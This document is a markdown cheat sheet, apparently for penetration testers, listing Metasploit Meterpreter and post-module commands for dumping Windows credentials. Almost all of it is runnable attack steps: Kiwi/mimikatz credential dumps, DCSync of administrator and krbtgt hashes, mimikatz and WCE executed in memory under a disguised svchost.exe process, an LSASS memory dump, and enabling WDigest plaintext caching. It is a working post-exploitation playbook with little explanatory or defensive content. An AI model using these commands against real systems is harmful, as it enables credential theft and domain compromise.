# Metasploit

## 01 - Meterpreter

### 1.1 - Kiwi

#### 1.1.1 - Help Menu

```
meterpreter > load kiwi

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
```

#### 1.1.2 - Dump All Creds

```
meterpreter > creds_all
```

#### 1.1.3 - SAM

```
meterpreter > lsa_dump_sam
```

#### 1.1.4 - Wdigest

```
meterpreter > creds_wdigest
```

#### 1.1.5 - LiveSSP

```
meterpreter > creds_livessp
```

#### 1.1.6 - MSV

```
meterpreter > creds_msv
```

#### 1.1.7 - SSP

```
meterpreter > creds_ssp
```

#### 1.1.8 - TSPKG

```
meterpreter > creds_tspkg
```

#### 1.1.9 - Kiwi Commands

```
meterpreter > kiwi_cmd '"lsadump::dcsync /user:administrator"'

meterpreter > kiwi_cmd '"lsadump::dcsync /user:krbtgt"'

meterpreter > kiwi_cmd '"lsadump::dcsync /user:<username>"'
```

### 1.2 - Execute binary tools via memory

```
meterpreter > execute -Hicmd svchost.exe -f /home/user/wce.exe -a -w

meterpreter > execute -Hic -f /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -m -d svchost.exe

meterpreter > execute -Hicmd svchost.exe -f /home/user/mimikatz.exe -a '"sekurlsa::logonpasswords full" exit'
```

## 02 - Post Module

Dump the process memory.

```
msf > use post/windows/gather/memory_dump

msf post(windows/gather/memory_dump) > options 

Module options (post/windows/gather/memory_dump):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   DUMP_PATH                      no        File to write memory dump to
   DUMP_TYPE     standard         yes       Minidump size (Accepted: standard, full)
   PID                            no        ID of the process to dump memory from
   PROCESS_NAME                   no        Name of the process(es) to dump memory from
   SESSION                        yes       The session to run this module on


View the full module info with the info, or info -d command.

msf post(windows/gather/memory_dump) > set process_name lsass.exe

msf post(windows/gather/memory_dump) > set pid <process_ID>

msf post(windows/gather/memory_dump) > set dump_type <standard | full>

msf post(windows/gather/memory_dump) > set dump_path "<C:\\path\\to\directory\\"

msf post(windows/gather/memory_dump) > run
```

### 2.1 - Wdigest

```
meterpreter > run post/windows/manage/wdigest_caching

meterpreter > run post/windows/gather/credentials/sso
```

### 2.2 - LSA Secrets

```
meterpreter > run post/windows/gather/lsa_secrets
```

---
## References

- [Hacking Articles: Metasploit for Pentester Mimikatz](https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/)

- [Hacking Articles: Credential Dumping Wdigest](https://www.hackingarticles.in/credential-dumping-wdigest/)

- [Astr0baby: Running Latest x64 Mimikatz on Windows 10](https://astr0baby.wordpress.com/2018/01/30/running-latest-x64-mimikatz-on-windows-10/)

- [Justinelze: WCE and Mimikatz in Memory over Meterpreter](https://justinelze.wordpress.com/2013/03/25/wce-and-mimikatz-in-memory-over-meterpreter/) 